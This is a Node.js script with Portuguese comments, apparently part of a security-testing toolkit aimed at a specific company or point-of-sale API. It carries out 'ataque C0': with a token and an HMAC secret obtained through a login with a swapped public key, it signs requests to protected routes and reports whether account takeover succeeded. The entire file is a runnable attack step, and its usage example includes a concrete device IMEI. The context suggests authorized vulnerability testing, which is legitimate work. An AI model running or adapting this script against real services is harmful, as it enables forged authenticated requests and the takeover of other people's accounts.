// Testa UMA requisição assinada em qualquer rota protegida.
// É o teste decisivo do ataque C0: dado um accessToken + sessionHmacSecret
// obtidos em login com pubkey TROCADA, confirma se o server aceita a request.
//
// Uso:
//   npm run testar-rota -- --token=<jwt> --secret=<hmac> [--rota=<path>] [--body='<json>']
//
// Defaults:
//   rota = /api/Empresa/ListarEmpresa
//   body = {"emailUsuario": APP_EMAIL}
//
// Exemplos:
//   # testa default (ListarEmpresa)
//   npm run testar-rota -- --token=eyJ... --secret=abc...
//
//   # testa Consultar com body customizado
//   npm run testar-rota -- --token=eyJ... --secret=abc... --rota=/api/PDVConfiguration/ConsultarNomePDVCadastrado --body="{\"imei\":\"352099001761482\",\"sync\":false,\"IdEmpresa\":1}"

import ALVO from '../config.js';
import { coletarResposta } from './http.js';
import { assinarRequisicao } from './assinatura.js';

// Parse args
const args = Object.fromEntries(
	process.argv.slice(2).map((a) => {
		const [k, ...v] = a.replace(/^--/, '').split('=');
		return [k, v.join('=')];
	}),
);

if (!args.token || !args.secret) {
	console.error('');
	console.error('❌ Faltou token ou secret.');
	console.error('   Uso: npm run testar-rota -- --token=<jwt> --secret=<hmac-decriptado> [--rota=<path>] [--body=<json>]');
	console.error('');
	process.exit(1);
}

const rota = args.rota || ALVO.rotas.protegida;
const urlProtegida = ALVO.baseUrl + rota;
const corpo = args.body || JSON.stringify({ emailUsuario: ALVO.emailParaRefresh });

console.log('');
console.log('── Testando rota protegida (POST /api/Empresa/ListarEmpresa) ──');
console.log(`  URL         : ${urlProtegida}`);
console.log(`  Body        : ${corpo}`);
console.log(`  Bearer      : ${args.token.slice(0, 30)}...`);
console.log(`  Secret HMAC : ${args.secret.slice(0, 20)}...`);
console.log('');

const resp = await coletarResposta(urlProtegida, {
	metodo: 'POST',
	headers: {
		'content-type': 'application/json',
		authorization: `Bearer ${args.token}`,
	},
	headersPadrao: ALVO.headersPadrao,
	body: corpo,
	assinarComSegredo: args.secret,
});

// Mostra signature que foi calculada
const sigHeaders = assinarRequisicao(corpo, args.secret);
console.log('── Signature calculada ──');
console.log(`  X-Ev3-Timestamp: ${sigHeaders['X-Ev3-Timestamp']}`);
console.log(`  X-Ev3-Nonce    : ${sigHeaders['X-Ev3-Nonce']}`);
console.log(`  X-Ev3-Signature: ${sigHeaders['X-Ev3-Signature']}`);
console.log('');

console.log(`── Resposta do server ──`);
console.log(`  Status: ${resp.status} ${resp.statusText}`);
console.log(`  Body  : ${resp.corpo.slice(0, 500)}`);
console.log('');

if (resp.status >= 200 && resp.status < 300) {
	console.log('🚨 ATAQUE C0 CONFIRMADO');
	console.log('   Server aceitou a request assinada com secret obtido via pubkey TROCADA.');
	console.log('   Atacante com credenciais vazadas consegue tomar posse da conta.');
} else if (resp.status === 401) {
	console.log('✅ Ataque não funcionou — server tem outra camada de proteção.');
	console.log('   C0 precisa ser revisto. Investigação adicional necessária.');
} else {
	console.log(`⚠️ Resposta inesperada (${resp.status}). Investigar body.`);
}
console.log('');
